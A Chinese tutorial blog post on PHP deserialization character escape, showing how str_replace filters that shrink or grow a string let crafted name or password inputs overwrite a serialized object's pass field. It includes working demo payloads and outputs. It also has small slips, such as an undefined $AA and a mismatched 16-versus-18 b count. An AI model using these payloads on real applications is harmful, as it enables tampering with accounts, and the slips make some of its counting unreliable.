---
title: 简单弄懂php反序列化之字符逃逸(修改密码功能) 
tags: 
- 反序列化
- ctf
- php
categories: 
- web安全
---

字符逃逸，顾名思义就是字符被莫名处理后不能达到以前的效果。

简单的理解[序列化](https://so.csdn.net/so/search?q=序列化&spm=1001.2101.3001.7020)和反序列化就是：

**序列化：将对象转换为字符串；反序列化：将字符串转换为对象；**

这里区别于java的序列化，java是将对象转换为字节码的形式，一般是在一些IO流中，实现Serializable接口。

下面给出一段一段序列化：

``` 
O:5:"nlost":2:{s:4:"name";s:5:"admin";s:6:"passwd";s:5:"12345";}
```

从这里我们可以看到，对于每段序列化结果，都会以 **}** 代表结尾，这就是导致字符逃逸的原因。

假如我们在可以人为设置参数的地方写上特殊[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)，即包含 }，就可以导致原来的序列化失去该有的效果。

这里还有个前提条件就是**<font color=red >必须要包含字符替换函数</font>**，如str_replace('cc', 'b', $str), 把匹配到的'cc'替换为‘b’，这就导致替换的字符缺少一位，另一种情况就是str_replace('b', 'cc', $str),替换后字符多一位。

**对于将多个字符替换为少，可以称之为<font color=red >吃</font>;(吃掉后面的字符)**

**对于将少个字符替换为多，可以称之为 <font color=red >挤</font>；**

> ## 字符逃逸：‘吃’

给出一段正常的序列化：

``` php

<?php
function filter($str){
    return str_replace('cc', 'b', $str);
}
class nlost{
    public $name;
    public $pass;
    public function __construct($name,$pass){
        $this->name=$name;
        $this->pass=$pass;
    }
}
$a=new nlost('admin','12345');
echo serialize($AA).PHP_EOL;
$res=filter(serialize($a));
echo $res.PHP_EOL;
$c=unserialize($res);
echo "name:  ".$c->name."<br>";
echo "pass:  ".$c->pass;
?>
```

正常输出：

```
O:5:"nlost":2:{s:4:"name";s:5:"admin";s:4:"pass";s:5:"12345";}
O:5:"nlost":2:{s:4:"name";s:5:"admin";s:4:"pass";s:5:"12345";}
name:  admin
pass:  12345
```

假如name和pass是我们可以控制的参数，并且调用了filter()方法呢？

``` php
<?php
function filter($str){
    return str_replace('cc', 'b', $str);
}
class nlost{
    public $name;
    public $pass;
    public function __construct($name,$pass){
        $this->name=$name;
        $this->pass=$pass;
    }
}
$a=new nlost('cccccccccccccccccccccccccccccccccccc',';s:4:"pass";s:6:"hacker";}');
echo serialize($a).PHP_EOL;
$res=filter(serialize($a));
echo $res.PHP_EOL;
$c=unserialize($res);
echo "pass:  ".$c->pass;
?>
```

输出：

O:5:"nlost":2:{s:4:"name";s:36:"cccccccccccccccccccccccccccccccccccc<font color=red>";s:4:"pass";s:26:</font>";<font color=lightgreen>s:4:"pass";s:6:"hacker";}</font>";}
O:5:"nlost":2:{s:4:"name";s:36:"bbbbbbbbbbbbbbbbbb";s:4:"pass";s:26:";s:4:"pass";s:6:"hacker";}";}
pass:  hacker

filter方法中我们知道，每2个c就被替换为1个b，红色部分是我们在每次正常序列化时都会产生的部分，也就是我们需要吃掉的部分，不然每次解析的时候都会多出那一部分。利用filter方法，红色部分共18个字符，那么就需要吃掉18个，所以就需要36c，经过filter后变为16个b，剩下的16个用红色部分字符补充，后面跟的pass（绿色部分）就是我们自己按序列化形式写的，以} 结尾，

这就实现了字符逃逸被 ‘吃’ 的情况。更改了我们的账号和密码。

> ## 字符逃逸：‘挤’

下面说一下‘挤’的情况：

``` php
<?php
function filter($str){
    return str_replace('b', 'cccc', $str);
}
class nlost{
    public $name;
    public $pass;
    public function __construct($name,$pass){
        $this->name=$name;
        $this->pass=$pass;
    }
}
$a=new nlost('bbbbbbbbb";s:4:"pass";s:6:"hacker";}','1243');
echo serialize($a).PHP_EOL;
$res=filter(serialize($a));
echo $res.PHP_EOL;
$c=unserialize($res);
echo 'pass:  '.$c->pass;
?>
```

输出：

O:5:"nlost":2:{s:4:"name";s:36:"bbbbbbbbb<font color=red>";s:4:"pass";s:6:"hacker";}</font>";s:4:"pass";s:4:"1243";}
O:5:"nlost":2:{s:4:"name";s:36:"cccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:4:"1243";}
pass:  hacker

原理都相同，就是替换后字符变多，将多的字符挤了出去。先找到固定序列化输出部分（就是正常情况下构造恶意的pass的序列化输出），判断位数；

红色部分就是我们构造的目标语句，共占27个字符，其中1个b替换为4个c,多了3个字符，27/3=9，所以需要9个b就会将红色部分挤到pass的位置。而又因为红色部分包含 }，会提前结束，就会放弃后面的部分，导致pass被更改。 